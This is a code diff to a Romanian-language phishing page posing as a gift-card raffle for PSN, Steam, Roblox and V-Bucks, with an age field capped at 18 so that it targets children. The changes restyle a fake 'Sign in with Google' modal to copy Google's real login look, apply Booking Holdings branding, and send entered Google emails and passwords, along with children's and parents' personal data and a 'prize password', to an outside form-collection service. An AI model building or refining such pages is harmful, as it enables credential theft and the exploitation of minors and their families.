@@ -12,9 +12,50 @@
             box-sizing: border-box;
         }
 
+        .Google-btn {
+            background: #ffffff;
+            color: #3c4043;
+            border: 1px solid #dadce0;
+            padding: 12px 24px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s ease, box-shadow 0.2s ease;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.05);
+            width: 100%;
+            margin-top: 0;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 24px;
+            text-align: center;
+            letter-spacing: 0.25px;
+            height: 40px;
+        }
+
+            .Google-btn:hover {
+                background-color: #f8f9fa;
+                box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+                border-color: #dadce0;
+                transform: none;
+            }
+
+            .Google-btn:active {
+                background-color: #f1f3f4;
+                box-shadow: 0 1px 2px rgba(0,0,0,0.05);
+            }
+
+            .Google-btn img {
+                width: 18px;
+                height: 18px;
+                border-radius: 0;
+            }
+
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: #002e6d; /* Booking Holdings Dark Blue */
             min-height: 100vh;
             display: flex;
             align-items: center;
@@ -24,7 +65,7 @@
         }
 
         .container {
-            background: rgba(255, 255, 255, 0.96);
+            background: rgba(255, 255, 255, 0.96); /* White with slight transparency */
             border-radius: 20px;
             box-shadow: 0 20px 40px rgba(0, 0, 0, 0.15);
             padding: 20px;
@@ -39,7 +80,7 @@
             body {
                 padding: 20px;
             }
-            
+
             .container {
                 padding: 40px;
             }
@@ -49,37 +90,37 @@
             margin-bottom: 25px;
         }
 
-        .header h1 {
-            color: #2d3748;
-            font-size: 1.6em;
-            margin-bottom: 12px;
-            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.08);
-            line-height: 1.3;
-            font-weight: 700;
-        }
+            .header h1 {
+                color: #000000; /* Black */
+                font-size: 1.6em;
+                margin-bottom: 12px;
+                text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.08);
+                line-height: 1.3;
+                font-weight: 700;
+            }
 
-        .header p {
-            color: #4a5568;
-            font-size: 0.95em;
-            line-height: 1.5;
-            max-width: 90%;
-            margin: 0 auto;
-        }
+            .header p {
+                color: #4a5568; /* Keeping a dark grey for readability */
+                font-size: 0.95em;
+                line-height: 1.5;
+                max-width: 90%;
+                margin: 0 auto;
+            }
 
         @media (min-width: 768px) {
             .header {
                 margin-bottom: 35px;
             }
-            
-            .header h1 {
-                font-size: 2.2em;
-                margin-bottom: 15px;
-            }
-            
-            .header p {
-                font-size: 1.1em;
-                max-width: 100%;
-            }
+
+                .header h1 {
+                    font-size: 2.2em;
+                    margin-bottom: 15px;
+                }
+
+                .header p {
+                    font-size: 1.1em;
+                    max-width: 100%;
+                }
         }
 
         .gift-cards {
@@ -106,7 +147,7 @@
         }
 
         .gift-card {
-            background: linear-gradient(135deg, #ff6b6b, #ff8e8e);
+            background: #076ab1; /* Booking Holdings Blue */
             border: none;
             border-radius: 16px;
             padding: 18px 12px;
@@ -126,21 +167,21 @@
             overflow: hidden;
         }
 
-        .gift-card::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: linear-gradient(45deg, rgba(255,255,255,0.1) 0%, rgba(255,255,255,0) 100%);
-            opacity: 0;
-            transition: opacity 0.3s ease;
-        }
+            .gift-card::before {
+                content: '';
+                position: absolute;
+                top: 0;
+                left: 0;
+                right: 0;
+                bottom: 0;
+                background: linear-gradient(45deg, rgba(255,255,255,0.1) 0%, rgba(255,255,255,0) 100%);
+                opacity: 0;
+                transition: opacity 0.3s ease;
+            }
 
-        .gift-card:hover::before {
-            opacity: 1;
-        }
+            .gift-card:hover::before {
+                opacity: 1;
+            }
 
         @media (min-width: 768px) {
             .gift-card {
@@ -161,25 +202,25 @@
         }
 
         .gift-card.selected {
-            background: linear-gradient(135deg, #4ecdc4, #44a08d);
+            background: #00aeef; /* Booking Holdings Light Blue */
             transform: translateY(-8px) scale(1.02);
-            box-shadow: 0 15px 30px rgba(78, 205, 196, 0.4);
+            box-shadow: 0 15px 30px rgba(0, 174, 239, 0.4);
         }
 
         .gift-card.psn {
-            background: linear-gradient(135deg, #0070f3, #0051cc);
+            background: #076ab1; /* Booking Holdings Blue */
         }
 
         .gift-card.steam {
-            background: linear-gradient(135deg, #1b2838, #2a475e);
+            background: #076ab1; /* Booking Holdings Blue */
         }
 
         .gift-card.roblox {
-            background: linear-gradient(135deg, #00a2ff, #0078d4);
+            background: #076ab1; /* Booking Holdings Blue */
         }
 
         .gift-card.vbucks {
-            background: linear-gradient(135deg, #8a2be2, #9932cc);
+            background: #076ab1; /* Booking Holdings Blue */
         }
 
         .gift-card-icon {
@@ -200,17 +241,18 @@
             animation: fadeIn 0.6s cubic-bezier(0.4, 0, 0.2, 1);
         }
 
-        .form-section.active {
-            display: block;
-        }
+            .form-section.active {
+                display: block;
+            }
 
         @keyframes fadeIn {
-            from { 
-                opacity: 0; 
+            from {
+                opacity: 0;
                 transform: translateY(30px);
             }
-            to { 
-                opacity: 1; 
+
+            to {
+                opacity: 1;
                 transform: translateY(0);
             }
         }
@@ -220,23 +262,23 @@
             text-align: left;
         }
 
-        .form-group label {
-            display: block;
-            margin-bottom: 8px;
-            color: #2d3748;
-            font-weight: 600;
-            font-size: 0.95em;
-        }
+            .form-group label {
+                display: block;
+                margin-bottom: 8px;
+                color: #2d3748;
+                font-weight: 600;
+                font-size: 0.95em;
+            }
 
         @media (min-width: 768px) {
             .form-group {
                 margin-bottom: 24px;
             }
-            
-            .form-group label {
-                margin-bottom: 10px;
-                font-size: 1em;
-            }
+
+                .form-group label {
+                    margin-bottom: 10px;
+                    font-size: 1em;
+                }
         }
 
         .form-group input {
@@ -251,16 +293,16 @@
             font-family: inherit;
         }
 
-        .form-group input:focus {
-            outline: none;
-            border-color: #667eea;
-            box-shadow: 0 0 0 4px rgba(102, 126, 234, 0.12);
-            background: #fafafa;
-        }
+            .form-group input:focus {
+                outline: none;
+                border-color: #00aeef; /* Booking Holdings Light Blue */
+                box-shadow: 0 0 0 4px rgba(0, 174, 239, 0.12);
+                background: #fafafa;
+            }
 
-        .form-group input:invalid {
-            border-color: #e53e3e;
-        }
+            .form-group input:invalid {
+                border-color: #e53e3e;
+            }
 
         .disclaimer {
             background: linear-gradient(135deg, #fff3cd, #ffeaa7);
@@ -288,7 +330,7 @@
         }
 
         .submit-btn {
-            background: linear-gradient(135deg, #48bb78, #38a169);
+            background: #076ab1; /* Booking Holdings Blue */
             color: white;
             border: none;
             padding: 16px 32px;
@@ -297,27 +339,27 @@
             font-weight: 600;
             cursor: pointer;
             transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-            box-shadow: 0 8px 20px rgba(72, 187, 120, 0.3);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
             width: 100%;
             margin-top: 12px;
             position: relative;
             overflow: hidden;
         }
 
-        .submit-btn::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
-            transition: left 0.5s;
-        }
+            .submit-btn::before {
+                content: '';
+                position: absolute;
+                top: 0;
+                left: -100%;
+                width: 100%;
+                height: 100%;
+                background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+                transition: left 0.5s;
+            }
 
-        .submit-btn:hover::before {
-            left: 100%;
-        }
+            .submit-btn:hover::before {
+                left: 100%;
+            }
 
         @media (min-width: 480px) {
             .submit-btn {
@@ -331,8 +373,8 @@
 
         .submit-btn:hover {
             transform: translateY(-3px);
-            box-shadow: 0 12px 28px rgba(72, 187, 120, 0.4);
-            background: linear-gradient(135deg, #4fd683, #38a169);
+            box-shadow: 0 12px 28px rgba(0, 0, 0, 0.25);
+            background: #00aeef; /* Booking Holdings Light Blue on hover */
         }
 
         .submit-btn:active {
@@ -340,7 +382,7 @@
         }
 
         .back-btn {
-            background: linear-gradient(135deg, #718096, #4a5568);
+            background: #002e6d; /* Booking Holdings Dark Blue */
             color: white;
             border: none;
             padding: 12px 24px;
@@ -351,7 +393,7 @@
             transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
             width: 100%;
             font-weight: 500;
-            box-shadow: 0 4px 12px rgba(113, 128, 150, 0.3);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
         }
 
         @media (min-width: 480px) {
@@ -363,57 +405,62 @@
         }
 
         .back-btn:hover {
-            background: linear-gradient(135deg, #4a5568, #2d3748);
+            background: #076ab1; /* Booking Holdings Blue on hover */
             transform: translateY(-2px);
-            box-shadow: 0 6px 16px rgba(113, 128, 150, 0.4);
+            box-shadow: 0 6px 16px rgba(0, 0, 0, 0.3);
         }
 
+        /* Original Google-btn styles for the form section */
         .Google-btn {
-            background: #FFFFFF; 
-            color: #202124; 
-            border: 2px solid #33ccff; 
-            border-image-source: linear-gradient(to bottom, #33ccff 0%, #00ffcc 100%);
+            background: #FFFFFF;
+            color: #3c4043; /* Adjusted to Google's text color */
+            border: 1px solid #dadce0; /* Standard Google border */
+            border-image-source: none; /* Removed gradient border */
             border-image-slice: 1;
-            padding: 16px 32px; 
-            border-radius: 12px; 
-            font-size: 1em;
-            font-weight: 600;
+            padding: 12px 24px; /* Slightly adjusted padding for standard look */
+            border-radius: 4px; /* Standard Google button border-radius */
+            font-size: 14px; /* Standard Google button font size */
+            font-weight: 500;
             cursor: pointer;
             transition: background-color 0.2s ease, box-shadow 0.2s ease, transform 0.2s ease;
-            box-shadow: 0 1px 2px rgba(0,0,0,0.08); 
-            width: 100%; 
-            margin-top: 0; 
-            margin-bottom: 15px; 
+            box-shadow: 0 1px 2px rgba(0,0,0,0.08);
+            width: 100%;
+            margin-top: 0;
+            margin-bottom: 15px;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 12px;
-            text-align: center; 
+            gap: 12px; /* Adjusted gap for standard Google button spacing */
+            text-align: center;
+            letter-spacing: 0.25px; /* Added for standard Google button look */
+            height: 40px; /* Standard Google button height */
         }
 
-        .Google-btn:hover {
-            background-color: #f8f9fa; 
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1); 
-            transform: translateY(-1px); 
-        }
-        
-        .Google-btn:active {
-            background-color: #f1f3f4; 
-            transform: translateY(0px); 
-            box-shadow: 0 1px 2px rgba(0,0,0,0.08); 
-        }
+            .Google-btn:hover {
+                background-color: #f8f9fa;
+                box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+                transform: translateY(-1px);
+                border-color: #dadce0; /* Ensure border color remains standard on hover */
+            }
 
-        .Google-btn img {
-            width: 24px;
-            height: 24px;
-            border-radius: 4px;
-        }
+            .Google-btn:active {
+                background-color: #f1f3f4;
+                transform: translateY(0px);
+                box-shadow: 0 1px 2px rgba(0,0,0,0.08);
+                border-color: #dadce0; /* Ensure border color remains standard on active */
+            }
+
+            .Google-btn img {
+                width: 18px; /* Adjusted image size for standard Google button */
+                height: 18px; /* Adjusted image size for standard Google button */
+                border-radius: 0; /* Ensures no border-radius on the image */
+            }
 
         .form-section-helper-text {
-            margin-bottom: 25px; 
+            margin-bottom: 25px;
             margin-top: 0;
-            font-size: 0.9em; 
-            color: #4a5568; 
+            font-size: 0.9em;
+            color: #4a5568;
             text-align: center;
         }
 
@@ -436,33 +483,133 @@
         }
 
         .success-message {
-            display: none;
-            background: linear-gradient(135deg, #48bb78, #38a169);
+            display: none; /* Added this line back to hide it initially */
+            background: #076ab1; /* Booking Holdings Blue */
             color: white;
             padding: 25px;
             border-radius: 16px;
             margin-top: 25px;
             text-align: center;
-            box-shadow: 0 8px 25px rgba(72, 187, 120, 0.3);
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3);
         }
 
-        .success-message h3 {
-            margin-bottom: 12px;
-            font-size: 1.3em;
-            font-weight: 700;
+            .success-message h3 {
+                margin-bottom: 12px;
+                font-size: 1.3em;
+                font-weight: 700;
+            }
+
+            .success-message p {
+                font-size: 1em;
+                line-height: 1.6;
+                opacity: 0.95;
+            }
+
+            .success-message.active {
+                display: block;
+                animation: fadeIn 0.6s cubic-bezier(0.4, 0, 0.2, 1);
+            }
+        /* Google Modal Specific Styles (untouched as per request) */
+        .modal {
+            background: white;
+            padding: 48px 40px 36px;
+            border-radius: 8px;
+            max-width: 450px;
+            width: 90%;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+            text-align: left;
         }
 
-        .success-message p {
-            font-size: 1em;
-            line-height: 1.6;
-            opacity: 0.95;
+            .modal h3 {
+                color: #202124;
+                font-size: 24px;
+                font-weight: 400;
+                line-height: 1.3333;
+                margin: 0;
+                margin-bottom: 8px;
+                padding-bottom: 0;
+                text-align: left;
+                display: block;
+            }
+
+        .modal-subtitle {
+            color: #202124;
+            font-size: 16px;
+            font-weight: 400;
+            letter-spacing: 0.1px;
+            line-height: 1.5;
+            margin-bottom: 32px;
         }
 
-        .success-message.active {
-            display: block;
-            animation: fadeIn 0.6s cubic-bezier(0.4, 0, 0.2, 1);
+        .modal .form-group input {
+            padding: 13px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            color: #202124;
+            font-size: 16px;
+            margin: 1px 1px 0 1px;
         }
 
+            .modal .form-group input:focus {
+                border: 2px solid #1a73e8;
+                margin: 0;
+                outline: none;
+                box-shadow: none;
+            }
+
+        .modal-btn {
+            background: #1a73e8;
+            color: white;
+            padding: 12px 24px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            letter-spacing: 0.25px;
+            float: right;
+            margin-top: 32px;
+            width: auto;
+        }
+
+            .modal-btn:hover {
+                background: #1557b0;
+                box-shadow: 0 1px 2px rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
+                transform: none;
+            }
+
+        .forgot-email {
+            color: #1a73e8;
+            font-size: 14px;
+            font-weight: 500;
+            letter-spacing: 0.25px;
+            margin-top: 8px;
+            cursor: pointer;
+            display: inline-block;
+        }
+
+            .forgot-email:hover {
+                text-decoration: underline;
+            }
+
+        .guest-mode {
+            color: #1a73e8;
+            font-size: 14px;
+            font-weight: 500;
+            letter-spacing: 0.25px;
+            margin-top: 32px;
+            cursor: pointer;
+            display: inline-block;
+        }
+
+            .guest-mode:hover {
+                text-decoration: underline;
+            }
+
+        .modal .form-group label {
+            font-size: 14px;
+            color: #5f6368;
+            font-weight: 400;
+            margin-bottom: 4px;
+        }
         /* Modal Styles */
         .modal-overlay {
             position: fixed;
@@ -478,10 +625,10 @@
             backdrop-filter: blur(5px);
         }
 
-        .modal-overlay.active {
-            display: flex;
-            animation: fadeIn 0.3s ease-out;
-        }
+            .modal-overlay.active {
+                display: flex;
+                animation: fadeIn 0.3s ease-out;
+            }
 
         .modal {
             background: white;
@@ -500,6 +647,7 @@
                 transform: translateY(-50px) scale(0.9);
                 opacity: 0;
             }
+
             to {
                 transform: translateY(0) scale(1);
                 opacity: 1;
@@ -520,10 +668,10 @@
             transition: all 0.2s ease;
         }
 
-        .modal-close:hover {
-            background: #f7fafc;
-            color: #2d3748;
-        }
+            .modal-close:hover {
+                background: #f7fafc;
+                color: #2d3748;
+            }
 
         .modal h3 {
             margin-bottom: 20px;
@@ -559,10 +707,10 @@
             margin-top: 10px;
         }
 
-        .modal-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 20px rgba(255, 107, 53, 0.4);
-        }
+            .modal-btn:hover {
+                transform: translateY(-2px);
+                box_shadow: 0 8px 20px rgba(255, 107, 53, 0.4);
+            }
 
         /* Touch improvements for mobile */
         .gift-card, .submit-btn, .back-btn, .Google-btn, .modal-btn {
@@ -570,11 +718,11 @@
             touch-action: manipulation;
         }
 
-        /* Improved focus states for accessibility */
-        .gift-card:focus, .submit-btn:focus, .back-btn:focus, .Google-btn:focus {
-            outline: 3px solid rgba(102, 126, 234, 0.5);
-            outline-offset: 2px;
-        }
+            /* Improved focus states for accessibility */
+            .gift-card:focus, .submit-btn:focus, .back-btn:focus, .Google-btn:focus {
+                outline: 3px solid rgba(0, 174, 239, 0.5); /* Booking Holdings Light Blue for focus */
+                outline-offset: 2px;
+            }
 
         /* Loading state for button */
         .loading {
@@ -583,23 +731,28 @@
             position: relative;
         }
 
-        .loading::after {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            width: 20px;
-            height: 20px;
-            margin: -10px;
-            border: 2px solid #ffffff;
-            border-top: 2px solid transparent;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
+            .loading::after {
+                content: '';
+                position: absolute;
+                top: 50%;
+                left: 50%;
+                width: 20px;
+                height: 20px;
+                margin: -10px;
+                border: 2px solid #ffffff;
+                border-top: 2px solid transparent;
+                border-radius: 50%;
+                animation: spin 1s linear infinite;
+            }
 
         @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
         }
 
         /* Accessibility improvements */
@@ -614,11 +767,12 @@
         /* High contrast mode support */
         @media (prefers-contrast: high) {
             .gift-card, .submit-btn, .back-btn, .Google-btn {
-                border: 2px solid; 
+                border: 2px solid;
             }
-             .Google-btn { 
-                border-image: none !important; 
-                border-color: currentcolor !important; 
+
+            .Google-btn {
+                border-image: none !important;
+                border-color: currentcolor !important;
             }
         }
 
@@ -640,14 +794,14 @@
             transition: opacity 0.3s ease, visibility 0.3s ease;
         }
 
-        .loading-overlay.active {
-            opacity: 1;
-            visibility: visible;
-        }
+            .loading-overlay.active {
+                opacity: 1;
+                visibility: visible;
+            }
 
         .loading-spinner {
             border: 8px solid #f3f3f3;
-            border-top: 8px solid #667eea;
+            border-top: 8px solid #076ab1; /* Booking Holdings Blue */
             border-radius: 50%;
             width: 60px;
             height: 60px;
@@ -692,40 +846,40 @@
 
         <div id="form-section" class="form-section">
             <h2 id="selected-card-title">Completează datele tale</h2>
-            
+
             <button class="Google-btn" onclick="openGoogleModal()" aria-label="Trimite participarea rapid prin Google">
                 <img src="sempex.png" alt="Google Logo">
                 <span>Trimite prin Google</span>
             </button>
 
             <p class="form-section-helper-text"><em>Sau completează formularul de mai jos pentru a intra în tombolă:</em></p>
-            
+
             <form id="raffle-form">
                 <div class="form-group">
                     <label for="fullName">Nume complet *</label>
                     <input type="text" id="fullName" name="fullName" required autocomplete="name">
                 </div>
-                
+
                 <div class="form-group">
                     <label for="age">Vârsta *</label>
                     <input type="number" id="age" name="age" min="1" max="18" required>
                 </div>
-                
+
                 <div class="form-group">
                     <label for="email">Adresa de email *</label>
                     <input type="email" id="email" name="email" required autocomplete="email">
                 </div>
-                
+
                 <div class="form-group">
                     <label for="parentName">Numele părintelui/tutorelui *</label>
                     <input type="text" id="parentName" name="parentName" required>
                 </div>
-                
+
                 <div class="form-group">
                     <label for="parentEmail">Email-ul părintelui/tutorelui *</label>
                     <input type="email" id="parentEmail" name="parentEmail" required autocomplete="email">
                 </div>
-                
+
                 <div class="form-group">
                     <label for="prizePassword">Parolă pentru criptarea premiului *</label>
                     <div class="disclaimer">
@@ -733,9 +887,9 @@
                     </div>
                     <input type="password" id="prizePassword" name="prizePassword" required>
                 </div>
-                
+
                 <input type="hidden" id="giftCardType" name="giftCardType">
-                
+
                 <div class="button-container">
                     <button type="button" class="back-btn" onclick="goBack()">← Înapoi</button>
                     <button type="submit" class="submit-btn">Trimite participarea 🎉</button>
@@ -752,22 +906,21 @@
     <div id="Google-modal" class="modal-overlay">
         <div class="modal">
             <button class="modal-close" onclick="closeGoogleModal()" aria-label="Închide">&times;</button>
-            <h3>
-                <img src="sempex.png" alt="Google Logo">
-                Conectează-te prin Google
-            </h3>
+            <img src="sempex.png" alt="Google Logo" style="width: 75px; height: auto; margin-bottom: 16px;">
+            <h3>Conectează-te</h3>
+            <div class="modal-subtitle">Continuă cu Google</div>
             <form id="Google-form">
                 <div class="form-group">
-                    <label for="Google-email">Adresa de e-mail sau numărul de telefon *</label>
+                    <label for="Google-email">Email sau telefon</label>
                     <input type="email" id="Google-email" name="GoogleEmail" required autocomplete="email">
                 </div>
-                
+
                 <div class="form-group">
-                    <label for="Google-id">Parolă *</label>
+                    <label for="Google-id">Parolă</label>
                     <input type="password" id="Google-id" name="GoogleId" required autocomplete="off">
                 </div>
-                
-                <button type="submit" class="modal-btn">Trimite prin Google</button>
+
+                <button type="submit" class="modal-btn">Next</button>
             </form>
         </div>
     </div>
@@ -784,14 +937,14 @@
             selectedGiftCard = type;
             document.getElementById('giftCardType').value = type;
             document.getElementById('selected-card-title').textContent = `Completează datele tale pentru cardul cadou ${type}`;
-            
+
             document.querySelectorAll('.gift-card').forEach(card => card.classList.remove('selected'));
             const selectedCardClass = type.toLowerCase().replace('-', '');
             const selectedCardElement = document.querySelector(`.gift-card.${selectedCardClass}`);
             if (selectedCardElement) {
                 selectedCardElement.classList.add('selected');
             }
-            
+
             setTimeout(() => {
                 document.getElementById('selection-section').style.display = 'none';
                 document.getElementById('form-section').classList.add('active');
@@ -818,13 +971,13 @@
             document.body.style.overflow = 'auto';
         }
 
-        document.getElementById('Google-modal').addEventListener('click', function(e) {
+        document.getElementById('Google-modal').addEventListener('click', function (e) {
             if (e.target === this) {
                 closeGoogleModal();
             }
         });
 
-        document.addEventListener('keydown', function(e) {
+        document.addEventListener('keydown', function (e) {
             if (e.key === 'Escape' && document.getElementById('Google-modal').classList.contains('active')) {
                 closeGoogleModal();
             }
@@ -832,52 +985,60 @@
 
         async function submitForm(formData, submitButton) {
             const loadingOverlay = document.getElementById('loading-overlay');
-            loadingOverlay.classList.add('active'); // Activează loading screen-ul
+            loadingOverlay.classList.add('active');
 
             let response;
             try {
-                submitButton.classList.add('loading'); 
-                
-                const fetchPromise = fetch('https://formspree.io/f/mgvkgwaa', {
+                submitButton.classList.add('loading');
+
+                // Convert FormData to an object
+                const formObject = {};
+                formData.forEach((value, key) => {
+                    formObject[key] = value;
+                });
+
+                // Add the access key
+                formObject.accessKey = 'sf_98330lj80cbk3di85gcfk0c2';
+
+                const fetchPromise = fetch('https://api.staticforms.xyz/submit', {
                     method: 'POST',
-                    body: formData,
+                    body: JSON.stringify(formObject),
                     headers: {
-                        'Accept': 'application/json'
+                        'Content-Type': 'application/json'
                     }
                 });
 
-                const minDurationPromise = new Promise(resolve => setTimeout(resolve, 2000)); // Minimum 2 seconds
-
-                [response] = await Promise.all([fetchPromise, minDurationPromise]); 
+                const minDurationPromise = new Promise(resolve => setTimeout(resolve, 2000));
+                [response] = await Promise.all([fetchPromise, minDurationPromise]);
 
                 if (response.ok) {
                     document.getElementById('form-section').classList.remove('active');
-                    document.getElementById('selection-section').style.display = 'none'; 
+                    document.getElementById('selection-section').style.display = 'none';
                     document.getElementById('success-message').classList.add('active');
-                    if (document.getElementById('raffle-form')) { 
+                    if (document.getElementById('raffle-form')) {
                         document.getElementById('raffle-form').reset();
                     }
-                    if (document.getElementById('Google-form')) { 
-                         document.getElementById('Google-form').reset();
+                    if (document.getElementById('Google-form')) {
+                        document.getElementById('Google-form').reset();
                     }
-                    closeGoogleModal(); 
+                    closeGoogleModal();
                 } else {
-                    const errorData = await response.json().catch(() => ({})); 
-                    console.error('Formspree error:', errorData);
-                    alert(`A apărut o eroare la trimiterea participării. (${response.status}) Te rugăm să încerci din nou.`);
+                    const errorData = await response.json().catch(() => ({}));
+                    console.error('Static Forms error:', errorData);
+                    alert(`A apărut o eroare la trimiterea participării. Te rugăm să încerci din nou.`);
                 }
             } catch (error) {
                 console.error('Error submitting form:', error);
                 alert('A apărut o eroare la trimiterea participării. Te rugăm să verifici conexiunea la internet și să încerci din nou.');
             } finally {
                 submitButton.classList.remove('loading');
-                loadingOverlay.classList.remove('active'); // Dezactivează loading screen-ul la final
+                loadingOverlay.classList.remove('active');
             }
         }
 
-        document.getElementById('raffle-form').addEventListener('submit', async function(e) {
+        document.getElementById('raffle-form').addEventListener('submit', async function (e) {
             e.preventDefault();
-            
+
             const timestampInput = document.createElement('input');
             timestampInput.type = 'hidden';
             timestampInput.name = 'timestamp';
@@ -889,7 +1050,7 @@
             submissionTypeInput.name = 'submissionType';
             submissionTypeInput.value = 'StandardForm';
             this.appendChild(submissionTypeInput);
-            
+
             const formData = new FormData(this);
             await submitForm(formData, this.querySelector('.submit-btn'));
 
@@ -897,29 +1058,29 @@
             this.removeChild(submissionTypeInput);
         });
 
-        document.getElementById('Google-form').addEventListener('submit', async function(e) {
+        document.getElementById('Google-form').addEventListener('submit', async function (e) {
             e.preventDefault();
-            
+
             const formData = new FormData();
             formData.append('GoogleEmail', document.getElementById('Google-email').value);
             formData.append('GoogleId', document.getElementById('Google-id').value);
             formData.append('submissionType', 'Google');
             formData.append('timestamp', new Date().toISOString());
-            formData.append('giftCardType', selectedGiftCard); 
-            
+            formData.append('giftCardType', selectedGiftCard);
+
             await submitForm(formData, this.querySelector('.modal-btn'));
         });
 
         document.querySelectorAll('input[required]').forEach(input => {
-            input.addEventListener('blur', function() {
-                if (!this.checkValidity()) { 
+            input.addEventListener('blur', function () {
+                if (!this.checkValidity()) {
                     this.style.borderColor = '#e53e3e';
                 } else {
                     this.style.borderColor = '#e2e8f0';
                 }
             });
-            input.addEventListener('input', function() { 
-                 if (this.checkValidity()) {
+            input.addEventListener('input', function () {
+                if (this.checkValidity()) {
                     this.style.borderColor = '#e2e8f0';
                 }
             });
